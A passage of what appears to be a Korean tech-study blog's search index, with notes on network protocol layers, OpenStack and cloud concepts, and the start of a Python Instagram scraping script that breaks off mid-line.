내용이 달라질 수 있음 ) Payload: 전송되는 실제 콘텐츠나 데이터 ( 이메일, 메시지, 인터넷 전화, 웹서핑 세션 등)    즉 위의 그림과 같이 데이터는 계층의 헤더 ( Hader ) + 페이로드 ( Payload )로 이루어져 있으며, 헤더가 붙은 계층에 따라 비트, 프레임, 패킷, 세그먼트, 데이터 라 한다.\n     각 네트워크 계층의 단위 \rNetwork Layer \r...\r\r\r\r\r  헤더는 우편 봉투에 적혀있는 주소와 유사한 열할을 하며, 페이로드는 편지봉투 안의 편지 내용을 뜻한다 할 수 있다\n  데이터는 데이터 상태로 상대방에게 바로 전달해주지 못한다. 그렇기에 상대방이 데이터를 볼 수 있게 송신과정을 거쳐야 하는 데 이를 인 캡슐레이션 이라 하며, 수신자는 반대로 수신과정을 거치는 데 이를 디 캡슐레이션 이라 한다.\n   네트워크 인 캡슐레이션 ( Network Encapsulation )  \rNetwork Encapsulation \r...\r\r   위에 언급한 듯이 송신자가 수신자에게 데이터를 볼 수 있도록 포장하는 것을 인캡슐레이션이라 하며 이는 OSI L7에서 L1 방향으로 진행 된다.\n  Payload를 4 계층 TCP 헤더로 캡슐화( 세그먼트 ) -\u0026gt; IPv4, TCP 헤더로 캡슐화 ( 패킷 ) -\u0026gt; IPv4, TCP, Ethernet( 프레임 )으로 캡슐화 하는 것을 인 캡슐레이션이라 한다.\n  \r\r\r 네트워크 디 캡슐레이션 ( Network Depsulation )  \rNetwork Decapsulation \r...\r\r  인캡슐레이션 되어진 ( 포장되어진 ) 페이로드를 읽기위해서 포장되어진 역 순서로 다시 헤더를 제거하는 것을 디 캡슐레이션이라 하며, OSI L1에서 L7 방향으로 진행 된다.\n  Payload를 IPv4, TCP, Ethernet ( 프레임 ) -\u0026gt; IPv4, TCP, ( 패킷 ) -\u0026gt; TCP ( 세그먼트 ) -\u0026gt; 데이터로 캡슐화를 해제하는 것을 디 캡슐레이션이라 한다.\n  \r\r\r     각 계층의 Protocol   각 프로토콜은 2진수 1개 = 1bit 2진수 8개 = 8bit 2진수 4개 = 16진수 1개 16진수 2개 = 2진수 8개 16진수 2개 8bit = 1byte를 뜻함   2계층 ( Data-Link )    2계층은 하나의 네트워크 대역 즉, 네트워크 상에 존재하는 여러 장비들 중에서 어떤 장비에게 보내는 데이터를 전달하는 역할 을 수행.\n  추가적으로 오류제어, 흐름제어 수행.\n  하나의 네트워크 대역 LAN에서만 통신할 때 사용하며,다른 네트워크와 통신 할 때에는 3계층이 도와주어야만 통 신이 가능\n    Ethernet 14byte Destination Address: 데이터를 전달받은 상대방의 시스템 MAC 주소 6byte Source Address: 데이터를 전달하는 시스템의 MAV 주소 6byte 상위 프로토콜 타입: 2byte, IPv4 ( 0x0800 ), ARD ( 0x0806 )     3계층 ( Network )  ARP Protocol    ARP 프로토콜은 같은 네트워크 대역에서 통신을 하기 위해 필요한 MAC주소를 IP주소를 이용해서 알아오는 프로토콜\n  같은 네트워크 대역에서 통신을 한다고 하여도 데이터를 보내기 위해서는 7계층부터 캡슐화를 통해 데이터를 보내기 때문에 IP주소와 MAC주소가 모두 필요하며, 이 때 IP주소는 알고 있어도 MAC 주소는 모르더라도 ARP를 통해 통신이 가능\n  ARP는 같은 대역에서만 사용가능\n     Hardware type, Protocol type, Hardware Address Length, Protocol affress Length는 모두 고유의 값을 가짐\n  Opcode: 세팅이 1이면 요청, 2면 답하는 것으로 세팅 됨\n  최소는 60byte, 최대는 1514byte\n   \rARP Process\r...\r\r  목적지 주소를 알지 못해, 목적지 주소 ( MAC )자리에는 0으로 비워둠\n  인캡슐레이션 후, 주소를 알지 못해 브로드캐스트 방식으로 모두에게 요청을 보낸 후, 아이피가 맞지 않으면 버리고, 맞는 아이피를 가지고 있는 PC는 자기의 주소를 다시 송신하고, 그러면 초기 송신자는 목적지 주소( MAC )를 알 수 있게 되어지는 원리\n   발신자\n 수신자\n\r\r\r   IPv4 Protocol    IPv4는 네트워크 상에서 데이터를 교환하기 위한 프로토콜이지만, 데이터가 정확하게 전달될 것을 보장하지는 않음\n  복된 패킷을 전달하거나 패킷의 순서를 잘못 전달할 가능성도 있음 (악의적으로 이용되면 DoS 공격이 됨 )\n  데이터의 정확하고 순차적인 전달은 그보다 상위 프로토콜인 TCP에서 보장\n    구조 설명   Version: IP 프로토콜의 버전 ( 대부분이 4, 16진수 중 하나 )\n  IHL ( Hearder Length ): 헤더의 길이 표현법 = n/4 최소 20 ~ 60\n  Type of Service ( TOS ): 데이터의 형식으로 현재는 잘 쓰이지 않으며 0으로 비워둠\n  Total Length: 모두를 합친 전체의 길이를 뜻함\n  Identification: 조각화 된 데이터의 ID를 부여하는 것\n  IP Flags X: 쓰이지 않음, D: 데이터를 송싱자가 안쪽에서 설정하는 것, M: 조각화가 진행될 경우 1로 세팅, 그렇지 않을 경우 0\n  Fragment Offset: 조각화가 발생했을 때 조각들의 시작 위치를 나타내는 값\n  offset: 어느 기준으로부터 얼마만큼 떨어져있는 지를 나타냄\n  Time to Live ( TTL ) : 패킷이 유지 될 수 있는 시간 ( 횟수 ), 네트워크 장비를 지나갈 때마다 1씩 줄어듬\n       ICMP Protocol   8 ( 요청 )/ 0 ( 정상적인 응답 ) 3 ( 목적지 도착 불가능 ) / 11 ( 시간 초과 ) 5 ( 리 다이렉트, 라우팅 테이블 수정 )    4계층 ( Transport )    4계층 전송 계층 ( Transprot layer )은 송신자의 프로세스와 수신자의 프로세스를 연결하는 서비스 를 제공하는 계층이다.\n  전송 계층은 연결 지향 데이터의 스트림 지원, 신뢰성, 흐름 제어, 그리고 다중화와 같은 편리한 서비를 제공한다.\n  전송 프로토콜 중 가장 장 알려진 것은 연결 지향전송박시으로 사용하는 전송제어 프로토콜( TCP ) 단순한 전송에 사용되는 사용자 데이터 프로토콜 ( UDP ) 가 있다\n   UDP Protocol    UDP 프로토콜 ( User Datagram Protocol )은 데이터 그램 프로토콜 ( Universal Datagram Protocol )이라고 일컫기도 한다.\n  UDP의 전송 방식은 너무 단순해서 서비스의 신뢰성이 낮고, 데이터그램의 도착 순서가 바뀌거나, 중복되거나, 심지어는 통보 없이 누락 시키기도 한다.\n  UDP는 일반적으로 오류의 검사와 수정이 필요 없는 프로그램에서 수행할 것으로 가정해야 한다.\n      TCP Protocol    전송 제어 프로토콜 (Transmission Control Protocol ) 은 인터넷에 연결된 컴퓨터에서 실행되는 프로그램 간에 통신을 안정적으로, 순서대로 에러없이 교환 할 수 있다\n  TCP의 안정성을 필요로 하지 않은 애플리케이션의 경우 일반적으로 TCP 대신 비접속형 사용자 데이터그램 프로토콜 ( User Datagream Protocol )을 사용하여, TCP는 UDP보다 안전하지만 느리다\n    TCP Fags  Window: 상대방과 데이터를 주고 받을 때, 얼마만큼의 데이터를 보낼 지 정하는 역할을 수행 ( 남아있는 TCP 공간을 알려줌 ) TCP Flags : 어떤값을 보낼지 세팅하는 값 C, E: 사용하지 않음 U: Uregent ( 긴급 bit ) - 우선순위가 포함되어있음 ( 1- 급한 데이터 ) A: Acknowledgment ( 승인 bit ) P: Push ( 밀어넣기 bit ) R: Reset ( 초기화 bit ) S: Syn ( 동기화 bit ) - 상대방과 연결을 시작할 때 반드시 사용 F: Fin ( 종료 bit )     3Way Handshake \r3Way Handshake\r...\r\r  TCP를 이용한 데이터 통신을 할 때 프로세스와 프로세스를 연결하기 위해 가장 먼저 수행되는 과정\n  클라이언트가 서버에게 요청 패킷을 보내고\n  서버가 클라이언트의 요청을 받아 패킷을 보내고\n  클라이언트는 이를 최종적으로 수락하는 패킷을 보낸다.\n      과정설명   보낸 쪽에서 보낼 때는 SEQ번호와 ACK번호가 그대로이다.\n  받는 쪽에서 SEQ번호는 받은 ACK번호가 된다.\n  받는 쪽에서 ACK번호는 받은 SEQ번호 + 데이터 크기가 된다.\n    \r\r\r   7계층 ( Application )  HTTP Protocol    DNS Protocol    기존의 192.168\u0026hellip;.. 등의 호스트 도메인의 이름을 네트워크 주소로 바꾸거나 그 반대의 변환을 수행을 위해 개발되어짐\n  일반적으로 www.xxx.com과 같은 도메인 주소를 입력하면 해당 주소에 맞는 IP주소로 변환시켜주는 역할을 수행\n  \rDNS 서버는 계층 구조로 이루어져 있음\r...\r\r DNS 서버는 계층 구조   루트 DNS 서버\n 최상위 레벨의 DNS 서버\n 책임 DNS 서버\n 로컬 DNS 서버로 구성\n    \r\r\r}\n     Domain address    인터넷 상에서의 주소인 URL의 일부\n  도메인 또는 도메인 네임( Domain name )은 넓게 보면 암기 및 식별하기 어려운 IP주소를 example.com처럼 기억하기 쉽게 만들어주는 네트워크 호스트를 의미\n  보통 루트 네임 서버( 최상위 DNS서버로 JAVA에서 관리 )에 등록된 최상위 호스트 네임을 관리하는 도메인 레지스트리에서 관리하는 하위 호스트 네임을 이르는 말\n     쿼리( Query )  재귀 쿼리\n 로컬 DNS서버와 주고받는 질의와 응답     반복 쿼리\n 로컬 DNS 서버가 다른 DNS 서버와 주고 받는 응답     권한이 없는 응답\n 반복 쿼리를 통해 알아온 주소     권한이 있는 응답\n 로컬 DNS가 알고 있는 주소     ZONE 영역파일   호스트 IP를 저장하고 있는 파일      IP( Internet Protocol )은 네트워크 계층에서 사용하는 주소로, 컴퓨터는 MAC주소를 사용하지만, 사람이 읽기 힘들어 읽기 편한 IP주소를 사용 한다.\n  3계층은 다른 네트워크 대역 즉, 멀리 떨어진 곳에 존재하는 네트워크까지 어떻게 데이터를 전달할지 제어하는 일을 담당, 발신에서 착신까지의 패킷의 경로를 제어하는 역할을 수행 하며 거리가 먼 다른 기기와 통신을 위해서는 3계층이 필요하다\n           "}),a.add({id:33,href:'/docs/network/network/',title:"Network 기본",content:"Network 기본    Network 기본\n  Network란 무엇인가?\n  Network Packet\n  Network PortNumber\n  SDN이란?\n  기본 3Tier 구축\n       Network 기본보안\n  Network 보안\n  firewall\n      "}),a.add({id:34,href:'/docs/openstack/openstack/openstack/',title:"OpenStack 개요",content:"인프라 환경 변화의 시작, 클라우드   클라우드 컴퓨팅의 정의와 종류  클라우드 컴퓨팅(Cloud Computing)   인터넷이 가능한 디바이스(스마트폰, 스마트패드, 스마트TV 등)로 클라우드에서 데이터를 처리하며, 저장 및 관리하는 컴퓨팅 시스템\n  클라우드 서비스의 종류\n  IaaS(Infrastrcture as a Service): 서버, 스토리지, 네트워크를 가상화 환경으로 만 들어 필요에 따라 인프라 자원을 제공하는 서비스\n  PaaS(Platform as a Service): 웹에서 개발 플랫폼을 제공하는 서비스\n  SaaS(Software as a Service): 온디맨드 소프트웨어(On-demand Software)라고도 하며, 중앙에서 호스팅 되는 소프트웨어를 웹 브라우저 등 클라우이언트로 이용하는 서비스\n  Daas(Desktop as a Service): 클라우드 인프라를 이용해 os가 설치된 인스턴스를 제공하는 서비스\n  BaaS(Backend as a Service): 모바일 환경에 맞춰 구현하기 힘든 백엔드 부분을 제공하는 서비스\n  Public Cloud: 언제든지 접근이 가능한 클라우드 서비스\n  Private Cloud: 외부에서는 접근이 불가능한 사내 클라우드 서비스\n  Hybrid Cloud Management System: 퍼블릭 클라우드와, 프라이빗 클라우드를 혼용하는 클라우드 서비스\n   클라우드 핵심 서비스 컴퓨트와 스토리지   컴퓨트 서비스(Compute Service)\n 사용자가 원하는 운영체제가 탑재된 컴퓨터나 서버를 인터넷에서 사용할 수 있게 제공하는 서비스    스토리지 서비스(Storage Service)\n 사용자가 소유한 데이터나 음악, 동영상, 문서 파일을 인터넷에 있는 스토리지에 저장, 삭제 공유할 수 있는 서비스      하이퍼바이저의 정의와 종류   하이퍼바이저의 정의    하이퍼바이저(Hypervisor)\n 가상 머신 모니터라고도 하며, 호스트 컴퓨터 한 대에서 운영체제 다수를 동시에 실행하는 논리적 플랫폼을 의미    하이퍼바이저의 분류\n Native, 베어메탈 방식: 하드웨어에 직접 설치해서 실행되는 방식 Hosted 방식: 애플리케이션처럼 프로그램으로 설치되는 방식    가상화 방식에 따른 하이퍼바이저의 분류\n  전가상화 방식(Full Virtualization): 하드웨어를 모두 가상화하는 방식으로, 게스트 운영체제를 변경하지 않고, 다양한 운영체제로 이용할 수 있음. Native 방식이 이에 해당\n  반가상화 방식(Para Virtualization): 하이퍼바이저로만 제어가 가능한 방식으로, 높은 성능의 유지가 가능하지만, 오픈 소스가 아니면 운영이 불가능\n      하이퍼바이저의 종류   KVM(for Kerne-based VirtualMachine):\n 오픈스택의 거본 하이퍼바이저로 전가상화 방식을 지원 반드시 Inter VT나 AMD-V가 있어야만 사용이 가능 리눅스, 윈도 이미지를 수정하지 않고 여러 가상 머신으로 실행이 가능    Xen과 Xen Server:\n Center를 이용한 관리 기능, 스토리지 지원과 실시간 마이그레이션, 고가용성 기능처럼 데이터센터에서 요구하는 확장 기능을 제공    Hyper-V:\n 디바이스 드라이버가 부모 파티션 위에서 동작하며, 콘솔 OS의 역할을 부모 파티션이 수행 다른 하이퍼바이저의 비해 크기가 작아 오류 코드가 포함될 확류이 낮음 Inter VT, AMD-V x64를 지원하는 하드웨어가 있어야 가상화가 가능    VMware vSphere ESX:\n 적은 하드웨어서도 애플리케이션을 통합할 수 있도록 서버를 가상화해주는 무료 베어메탈 하이퍼바이저 ESX는 가상 머신의 업무를 지원하는 역할을 수행, 가상 머신이 발생시킨 명령어를 하이퍼바이저가 받아 재작업 후, 가상 환경에서 잘 구동하도록 바이너리 변환 방식을 사용 Inter, VT, AMD-V 같은 가상화를 지원하는 디바이스가 없어도 가상화를 구현할 수 있음    Docker:\n 리눅스 기반의 컨테이너 런타임 오픈 소스로, 가상 머신과 기능이 유사하며, 가상 머신보다 훨씬 가벼운 형태로 배포가 가능 컨테이너의 개념으로 가상 머신처럼 Docker Engine을 호스트 웨어서 수행하며, 리눅스 기반의 운영체제만 수행이 가능 가상 머신처럼 하드웨어를 가상화하는 것이 아니라, 게스트 OS를 분리시켜 제공 호스트 운영체제의 프로세스 공간을 공유한다고 할 수 있음    VirtualBox:\n 리눅스, OS X, 솔라리스, 윈도를 게스트 운영체제로 가상화하는 x86 가상화 소프트웨어 다른 하이퍼바이저와 비교했을 때는 기능이 부족 원격 데스크톱 프로토콜(RDP), iSCSI 지원, RDP를 거치는 원격 디바이스의 USB 지원처럼 원격 가상 컴퓨터를 제어할 수 있는 기능이 있음 Inter VT와 AMD-V를 지원    VMware Workstation:\n 게스트 운영체제에 설치할 수 있는 다리이버 및 기타 소프트웨어의 묶음 게스트 머신이 고해상도 화면에 접근할 수 있게 하는 VESA호한 그래픽, 네트워크 인터페이스 카드용 네트워크 드라이버, 호스트와 게스트 간 클립보드 공유, 시간 동기화 기능 등을 제공    Parallels Desktop:\n 맥용 인텔 프로세서가 있는 매킨토시 컴퓨터에 하드웨어 가상화를 제공하려고 만든 소프트웨어 MS-DOS, 윈도, 맥, 리눅스, 솔라시스 등 다양한 운영체제를 가상화 할 수 있음      하이퍼바이저별 이미지 포맷  KVM: img, qcow2, vmdk VMWARE: vmdk 오라클 VirtualBOx: vdi, vmdk, qcow2, vhd 마이크로소프트 Hyper-V: vhd, vmdk, vdi Xen, Xen Server: qcow2, vhd    이미지포맷 설명  qcow2: QEMU Copy On Write 2 vdi: Virtual Disk Image vmdk: VMware Virtual Disk DevelopmentKit vhd: Virtual Hard Disk    클라우드에서 알아야 할 네트워크 상식     고정 IP, 유동 IP\n 고정IP (Fixed IP): 인터넷 공유기를 연결해 고정으로 할당받는 IP 유동IP (Floating IP): 가상 인스턴스가 외부에서 접근할 수 있도록 할당하는 인터넷이 가능한 IP    클래스의 범위\n A 클래스: 1 ~ 126 B 클래스: 128 ~ 191 C 클래스: 192 ~ 223 D 클래스: 224 ~ 239 E 클래스: 240 ~ 254 멀티캐스트는 D 클래스, E 연구 개발 목적으로 예약된 클래스      CIDR(Classless Inter-Domain Routing)  클래스가 없는 도메인간 라우팅 기법으로 기존 IP할당 방식인 네트워크 클래스를 대체 급격히 부족해지는 IPv4 주소를 좀 더 효율적으로 사용 접두어를 이용한 주소 지정 방식의 계층적 구조를 사용해 인터넷 라우팅의 부담을 덜어 줌    SDN(Software Defined Networking)  네트워크 제어 기능이 물리적 네트워크와 분리되도록 프로그래밍한 네트워크 구조를 뜻함 네트워크 제어 기능을 데이터 전달 기능과 분리해서 구현해야 한다. 네트워크 제어 기능이 개발되고 실행될 수 있는 환경을 분리해 낮은 성능의CPU가 있는 하드위어 위에 스위치에 더 이상 위치시키지 않는다.    오픈플로(OpenFlow)  SDN의 근간이 되는 기술로 SDN 아키텍처의 컨트롤 레이어와 인프라스트럭처 레이어 사이에 정의된 최초의 표준 통신 인터페이스 흐름정보로 패킷의 전달 경로와 방식을 제어 오픈플로는 오픈플로 컨트롤러와 오픈플로로 지원 네트워크 장비(라우터, 스위치) 사이에서 커뮤니케이션 역할을 담당 일반적인 네트워크 장비(라우터, 스위치)는 플로 테이블을 이용해서 네트워크 트래픽을 처리하는 반면, 오픈플로는 소프트웨어 컨트롤러로 플로테이블을 조작하고 데이터 경로를 설정    네트워크 장비    라우터(Router):\n 인터넷 등 서로 다른 네트워크를 연결할 때 사용하는 장비 데이터 패킷이 목적지까지 갈 수 있는 경로를 검사하여 최적의 경로를 탐색하는 것을 라우팅이라 함 경로가 결정되면 결정된 길로 데이터 패킷하는 것을 스위칭이라고 함    허브(Hub):\n 인터넷이 등장하기 이전, 컴퓨터와 컴퓨터를 연결해 네트워크를 구성하는 장비 멀티포트(Multiport) 또는 리피터(Repeater)라고도 할 수 있습니다.    CSMA/CD(Carrier Sense Multiple Access/Collision Detect):\n 이더넷 전송 프로토콜로 IEEE 802.3 표준에 규격화되어 있습니다.    브리지(Bridge):\n 콜리전(충돌) 도메인을 나누어 서로 통신이 가능하도록 다리처럼 연결해 주는 네트워크 장비 분리된 콜리전 도메인을 세그먼트라고 한다.    스위치(Switch)\n 브리지와 역할이 동일하지만, 소프트웨어적으로 처리하는 스위치가 소프트웨어적으로 처리하는 브리지보다 속도가 더 빠르다. 스위치가 브리지 보다 많은 포트 개수를 제공(20~ 100) 브리지는 Store-and-forward라는 프레임 처리 방식만 지원하지만, 스위치는 Cut-through, Store-and-forward라는 프레임 처리 방식을 지원    스위치 관련 용어\n 프레임: 데이터를 주고받을 때 데이터를 적절한 크기로 묶어 놓은 것 프레임 처리 방식: 입력되는 프레임을 스위칭하는 방식입니다. Store-and-forward: 들어오는 프레임 전부를 일단 버퍼에 담아 두고, CRC 등 오류 검출을 완전히 처리한 후 전달(포워딩)하는 스위칭 기법 Cut-through: 스위칭 시스템에서 수신된 패킷 부분만 검사해 이를 곧바로 스위칭하는 방식      블록 스토리지와 오브젝트 스토리지    블록 스토리지(Block Storage)와 오브젝트 스토리지(Object Storage)  블록 스토리지: 컴퓨터의 용량을 추가하는 것처럼 클라우드 상의 하드 디스크를 블록 스토리지라고 함 오브젝트 스토리지: 사용자 계정별로 저장 공간을 할당할 수 있는 스토리지 시스템으로 블록 스토리지와는 다르게 단독으로 구성이 가능하며, 계정의 컨테이너 파일이나 데이터를 저장할 수 있는 저장 공간      대표적인 스토리지 서비스    아마존의 EBS와 S3:\n EBS(Elastic Block Store)는 블록 스토리지에 해당하는 서비스 EC2(Elastic Compute Cloud)은 생성한 인스턴스에 확장해서 사용할 수 있는 스토리지 서비스 S3는 오브젝트 스토리지에 해당하는 서비스로 사용자 계정에 해당하는 Owner, 컨테이너에 해당하는 Bucket, 파일이나 해당데이터에 해당하는 오브젝트로 구성되어있다.    오픈스택의 Cinder와 Swift\n Cinder는 오픈스택의 기본 서비스 중 하나로 블록 스토리지 서비스를 제공한다. Cinder는 cinder-volume, cinder-backup, cinder-scheduler, Volume Provider, cinder-api로 구성 Nova에서 제공하는 인스턴스의 확장 스토리지로 사용할 수 있다. Swift는 오픈스택의 기본 서비스 중 하나로 오브젝트 스토리지 서비스를 제공한다. Swift는 proxy-server, account-server, container-server, object-server, swift-api로 구성된다. proxy-server는 여러 대의 스토리지 노드로 구성된 account-server, container-server, object-server을 관리한다.    Ceph의 RBD와 RADOS\n Ceph는 모든 종류의 스토리지 서비스를 모아 놓은 오픈 소스 서비스라고 할 수 있다. RADOS라는 스토리지 노드 위에 LIBRADOS라는 RADOS 라이브러리가 있다. 아마존의 S3, 오픈스택의 Swift와 연동하는 RADOSGW(게이트웨이)가 있다 QEMU나 KVM에서 생성한 인스턴스를 블록 스토리지로 사용하는 RBD(Rados Block Device), 사용자의 편의성을 제공하려고 POSIX(표준 운영체제 인터페이스)를 제공하는 Ceph FS로 구성되어 있다.       OpenStack   오픈스택과 아키텍처  오픈스택   오픈스택은 컴퓨트, 오브젝트 스토리지, 이미지, 인증 서비스 등이 유기적으로 연결되어 하나의 커다한 클라우드 컴퓨팅 시스템을 구축하는 것.\n  개념 아키텍처로 살펴보는 오픈스택의 변화\n   \r 오픈스택의 변화\r...\r\r 백사버전부터는 컴퓨트 서비스에는 Nova 추가 스토리지 서비스에는 Swift 추가 이미지 관리 서비스에는 Glance 추가 Nova, Swift, Glance의 인증을 담당하는 Keystone 추가 서비스를 보다 쉽게 이용하려고 사용자에게 대시보드를 제공하는 Horizon 추가 폴섬 버전부터는 네트워크 서비스와 블록 스로리지 서비스를 Quantum와 Cinder 로 분류함 Quantum은 기존 nova-network와 다르게 OpenFlow를 사용해서 여러 네트워크 컨트롤러의 지원이 가능 하바나버전부터는 오케스트레이션 서비스인 Heat와 텔레미터 서비스인 Ceilometer가 있습니다. 킬로 이후 버전부터는 빅데이터 프로세싱 프레임워크인 Sahara 추가 데이터베이스 서비스인 Trove 추가 PXE나 IPMI를 사용해 베어메탈을 프로비저닝하는 Ironic 추가 코어 서비스 6개와 이를 지원하는 많은 서비스를 표현한 빅텐트(Big-tent)라는 개념 추가  \r\r\r  클라우드 서비스(오픈스택을 기준으로)    시스템 관련 클라우드 서비스\n Nova    스토리지 관련 클라우드 서비스\n Swift : 객체 스토리지 Cinder : 블록 스토리지    네트워크 관련 클라우드 서비스\n Neutron    데이터 관련 클라우드 서비스\n Glance Trove    기타 클라우드 서비스\n Horizon Keystone      논리 아키텍처로 살펴보는 오픈스택의 변화   \r 오픈스택의 변화\r...\r\r  상황별 오픈스택 구성 요소\n 사내 클라우드 컴퓨팅 환경을 구축할 때나 퍼블릭 클라우드 서비스를 구성할 때 오픈스택을 주로 채택 회사의 클라우드 환경을 어떤 목적으로 사용하느냐에 따라 선택해야할 서비스가 달라질 수 있음      HTC(High Throughput Computing):  HTC 사용자는 종종 Nova 컴퓨트로 전환해 Horizon 대시보드로 단일 API 엔드포인트를 사용자에게 제공함. Keystone은 일반적으로 사용자 계정이 저장되는 LDAP 백엔드를 연결하는 데 사용 이런 종류의 프로젝트를 구성하려면 다음이 서비스가 필요함  대시보드 서비스 Horizon 텔레미터 서비스 Ceilometer 블록 스토리지 서비스 Cinder 오케스트레이션 서비스 Heat 이미지 서비스 Glance 인증 서비스 keystone 컴퓨트 서비스 Nova        웹 호스팅:  웹 호스팅 회사 중 하나로 수백만 개의 호스팅 사용하는 데 오픈스택을 활용 Nova, Neutron, Keystone, Glance, Horizon 같은 일반적인 코어 서비스를 이용 사용자 계정 데이터를 수집하고 요금을 청구할 때 일부 기술로 Ceilometer를 활용  네트워크 서비스 Neutron 대시보드 서비스 Horizon 텔레미터 서비스 Ceilometer 이미지 서비스 Glance 인증 서비스 keystone 컴퓨트 서비스 Nova        퍼블릭 클라우드:  오픈스택은 전 세계 사용자에에 IaaS를 제공하는 퍼블릭 클라우드를 지원 Nova, Glance, Keystone, Cinder, Neutron 같은 서비스를 제공 Swift를 사용해 오브젝트 스토리지 서비스를 제공, Designate는 DNSaaS(DNS as a Service)를 제공함  네트워크 서비스 Neutron 도메인 네임 서비스 Designate 블록 스토리지 서비스 Cinder 오브젝트 스토리지 서비스 Swift 이미지 서비스 Glance 인증 서비스 Keystone 컴퓨트 서비스 Nova        웹 서비스, 전자상거래:  이베이, 오버스톡닷컴, 베스트바이 등 많은 회사가 오픈스택을 이용해 웹 서비스도 하고 전자상거래의 백엔드로도 사용 상황에 맞춰 오픈스택 클라우드는 PCI 표준처럼 구성하기도 함 Trove는 내부 고객에게 데이터베이스 서비스인 DaaS를 제공, 네트워크 정의 소프트웨어 SDN은 Neutron을 제공  네트워크 서비스 Neutron 대시보드 서비스 Horizon 데이터베이스 서비스 Trove 블록 스토리지 서비스 Cinder 이미지 서비스 Glance 인증 서비스 Keystone 컴퓨트 서비스 Nova        컴퓨트 스타터 키트(Compute Starter Kit):  더 많은 사람이 오픈스택을 사용할 수 있도록 하는 것이 컴퓨터 스타터 키트라고 함 스타터 키트는 추가 기능으로 클라우드 확장할 수 있는 방법을 문서화로 제공하는 단순한 프로젝트를 의미함  네트워크 서비스 Neutron 이미지 서비스 Glance 인증 서비스 Keystone 컴퓨트 서비스 Nova        빅데이터:  다양한 리소스 데이터를 분석하는 빅데이터에도 활동 됨 빅데이터 분석 서비스인 Sahara 프로젝트는 오픈스택 위에 빅데이터 응용프로그램(Hadoop, Spark)을 간단하게 제공할 수 있음  네트워크 서비스 Neutron 대시보드 서비스 Horizon 베이메탈 서비스 Ironic 빅데이터 서비스 Sahara 이미지 서비스 Glance 인증 서비스 Keystone 컴퓨트 서비스 Nova        DBaaS:  대부분의 회사는 응용프로그램을 백업하려 데이터베이스에 크게 의존하며 일반적인 관리 자동화 및 스케일 아웃을 최우선으로 생각 오픈스택 Trove 프로젝트는 이 기능을 제공 및 여러 SQL 및 NoSQL 백엔드를 지원 Ironic 프로젝트는 데이터베이스의 성능을 극대화하려고 베어메탈 프로비저닝을 제공  네트워크 서비스인 Neutron 대시보드 서비스 Horizon 데이터베이스 서비스 Trove 도메인 네임 서비스 Designate 베어메탈 서비스 Ironic 블록 스토리지 서비스 Cinder 오브젝트 스토리지 서비스 Swift 이미지 서비스 Glance 인증 서비스 Keystone 컴퓨트 서비스 Nova        비디오 처리와 콘텐츠 전달:  제작 스튜디오나 주요 케이블 서비스 제공 업체 같은 곳의 비디오 처리(Video Processing), 콘텐츠 전달(Contents Delivery)은 오픈스택의 보편적인 사용 예시임 Keystone에서 선보인 인증 표준은 이제 동일한 대시보드와 인증을 사용해 프라이빗 클라우드 및 퍼블릭 클라우드에서 비디오 콘텐츠를 원할하게 이동시킬 수 있음  네트워크 서비스 Neutron 오브젝트 스토리지 서비스 Swift 인증 서비스 Keystone 컴퓨트 서비스 Nova        컨테이너 서비스:  가상머신, 컨테이너, 베어메탈에서 실행되는 워크로드를 단일 클라우드에서 운영할 수 있도록 개발되었음 Kubernetes, Mesos, Docker 같은 새로운 컨테이너 오케스트레이션 엔징(COE, container Orchestration Engices)와 통합하려고 Magnum 프로젝트에 엑세스 할 수 있음  네트워크 서비스 Neutron 대시보드 서비스 Horizon 베어메탈 서비스 Ironic 블록 스토리지 서비스 Cinder 이미지 서비스 Glance 인증 서비스 Keystone 컨테이너 서비스 Management 컴퓨트 서비스 Nova      \r\r\r  오픈스택 적용사례  업종별·목적별 클라우드 활용 사례  웹 사이트에서 클라우드 활용 소셜 게임의 클라우드 활용 애플리케이션 개발/테스트 환경에서의 클라우드 활용 스타트업 기업에서의 클라우드 활용 BCP(비지니스 연속성 계획)의 클라우드 활용 ERP(통합 기간 업무 시스템)에서의 클라우드 활용 제조업의 클라우드 활용 지자체 클라우드 교육 분야의 클라우드 활용 농업 분야의 클라우드 활용 빅 데이터 이용을 위한 클라우드의 활용 IoT에서 클라우드 활용 인공 지능 등의 새로운 산업 영역에서의 클라우드 활용    참고 홈페이지  오픈스택 릴리스 웹 사이트 Nalee의 IT 이야기    오픈스택 파운데이션과 커뮤니티  오픈스택 파운데이션:  나라별로 오픈스택 사용자 그룹을 운영하고 있다. 사용자 그룹은 공식 사용자 그룹과 일반 사용자 그룹으로 나뉨 오픈스택 사용자 그룹은 총 112개, 이중 공시기 사용자 그룹은 18개이며, 엠버서더로 활동하는 구성원은 총 12명, 아시아는 6명이다. 오픈스택은 버전별 컨트리뷰터 활동을 그래프와 표로 보여주는 http://stackalytics.com/을 운영한다.      \r"}),a.add({id:35,href:'/docs/development/python/code/',title:"Python Code",content:"메일 자동화  이미지 크롤링 from urllib.request import urlopen from urllib.parse import quote_plus from bs4 import BeautifulSoup from selenium import webdriver import time baseUrl = \u0026#39;https://www.instagram.com/explore/tags/\u0026#39; plusUrl = input(\u0026#39;검색할 태그를 입력하세요 : \u0026#39;) url = baseUrl + quote_plus(plusUrl) driver = webdriver.Chrome(\u0026#39;C:\\\\chromedriver.exe\u0026#39;) driver.get(url) time.sleep(3) html = driver.page_source soup = BeautifulSoup(html) insta = soup.select(\u0026#39;.v1Nh3.kIKUG._bz0w\u0026#39;) n = 1 for i in insta: print(\u0026#39;https://www.instagram.com\u0026#39;+ i.a[\u0026#39;href\u0026#39;]) imgUrl = i.select_one(\u0026#39;.KL4Bh\u0026#39;).img[\u0026#39;src\u0026#39;] with urlopen(imgUrl) as f: with open(\u0026#39;C:\\\\test\\\\\u0026#39; + plusUrl + str(n) + \u0026#39;.jpg\u0026#39;, \u0026#39;wb\u0026#39;) as h: img = f.read() h.write(img) n += 1 print(imgUrl) print() driver.close()  태그 크롤링 from bs4 import BeautifulSoup import selenium.webdriver as webdriver import urllib.parse from urllib.request import Request, urlopen from time import sleep import pandas as pd from multiprocessing import Pool, Value, freeze_support num = 0 def f(x): frame = [] global num req = Request(\u0026#39;https://www.instagram.com/p\u0026#39;+x,headers={\u0026#39;User-Agent\u0026#39;: \u0026#39;Mozilla/5.0\u0026#39;}) webpage = urlopen(req).read() soup = BeautifulSoup(webpage,\u0026#34;lxml\u0026#34;,from_encoding=\u0026#39;utf-8\u0026#39;) soup1 = soup.find(\u0026#34;meta\u0026#34;,attrs={\u0026#34;property\u0026#34;:\u0026#34;og:description\u0026#34;}) reallink1 = 